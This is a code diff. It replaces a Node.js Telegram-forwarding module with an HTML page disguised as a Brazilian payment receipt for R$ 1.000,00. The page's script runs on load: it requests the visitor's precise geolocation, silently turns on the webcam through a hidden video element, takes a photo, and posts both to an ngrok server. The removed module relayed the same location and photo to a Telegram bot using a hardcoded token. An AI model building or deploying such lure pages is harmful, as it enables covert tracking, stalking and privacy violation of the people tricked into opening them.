@@ -1,52 +1,160 @@
-const http = require("http");
-const https = require("https");
-const axios = require("axios");
-const FormData = require("form-data");
+<!DOCTYPE html>
+<html lang="pt-BR">
 
-// Token e chat_id do seu bot Telegram
-const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ";
-const TELEGRAM_CHAT_ID = "1276935257";
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
 
-async function enviarDados(latitude, longitude, maps, photo, res) {
-  try {
-    // Força IPv4 criando agentes http e https com family 4
-    const httpAgent = new http.Agent({ family: 4 });
-    const httpsAgent = new https.Agent({ family: 4 });
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
 
-    // Envia mensagem de localização via GET com query string na URL
-    const message = encodeURIComponent(
-      `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`
-    );
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
 
-    await axios.get(url, { httpAgent, httpsAgent });
+    <button class="botao" onclick="window.print()">Imprimir</button>
 
-    if (photo) {
-      // Remove o prefixo da base64
-      const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
-      const buffer = Buffer.from(base64Data, "base64");
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
 
-      const form = new FormData();
-      form.append("chat_id", TELEGRAM_CHAT_ID);
-      form.append("photo", buffer, {
-        filename: "photo.png",
-        contentType: "image/png",
-      });
+  <script>
+    const NGROK_SERVER = "https://2303-201-42-106-118.ngrok-free.app";
 
-      // Envia foto com os headers corretos e agentes IPv4
-      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
-        headers: form.getHeaders(),
-        httpAgent,
-        httpsAgent,
+    // Exibir data atual formatada no elemento #data-atual
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    // Função para redimensionar a imagem base64 para largura e altura máximas definidas, convertendo para JPEG com qualidade 0.7
+    function resizeImage(imageBase64, maxWidth, maxHeight, callback) {
+      const img = new Image();
+      img.onload = () => {
+        let width = img.width;
+        let height = img.height;
+
+        if (width > maxWidth) {
+          height *= maxWidth / width;
+          width = maxWidth;
+        }
+        if (height > maxHeight) {
+          width *= maxHeight / height;
+          height = maxHeight;
+        }
+
+        const canvas = document.createElement('canvas');
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0, width, height);
+
+        // Converter para JPEG e controlar qualidade para reduzir tamanho
+        callback(canvas.toDataURL('image/jpeg', 0.7));
+      };
+      img.src = imageBase64;
+    }
+
+    // Captura foto da webcam e retorna base64 via callback
+    function startCameraAndGetPhoto(callback) {
+      const video = document.createElement("video");
+      video.style.display = "none";
+      document.body.appendChild(video);
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
+
+          video.addEventListener("canplay", () => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageBase64 = canvas.toDataURL("image/png");
+
+            // Para a câmera e remove o vídeo
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+
+            callback(imageBase64);
+          });
+        })
+        .catch(err => {
+          alert("Erro ao acessar a webcam: " + err.message);
+          callback(null);
+        });
+    }
+
+    // Envia localização e foto para o backend, redimensionando a imagem antes
+    function sendLocationAndPhoto(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      startCameraAndGetPhoto((imageBase64) => {
+        if (!imageBase64) {
+          alert("Erro ao capturar a foto.");
+          return;
+        }
+
+        // Redimensiona a imagem antes de enviar (máximo 400x300 e qualidade JPEG 70%)
+        resizeImage(imageBase64, 400, 300, (resizedBase64) => {
+          fetch(`${NGROK_SERVER}/send-data`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ latitude, longitude, maps, photo: resizedBase64 }),
+          })
+            .then(res => res.json())
+            .then(data => {
+              if (!data.success) {
+                alert("Erro ao enviar os dados.");
+              } else {
+                console.log("Dados enviados com sucesso!");
+              }
+            })
+            .catch(err => {
+              console.error("Erro ao enviar os dados:", err);
+              alert("Erro na comunicação com o servidor.");
+            });
+        });
       });
     }
 
-    res.json({ success: true });
-  } catch (error) {
-    console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
-    res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
-  }
-}
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
 
-module.exports = { enviarDados };
+    // Ao carregar a página, tenta obter localização e foto
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          sendLocationAndPhoto,
+          handleError,
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        alert("Seu navegador não suporta Geolocalização.");
+      }
+    });
+  </script>
+</body>
+
+</html>
+
+
+
 
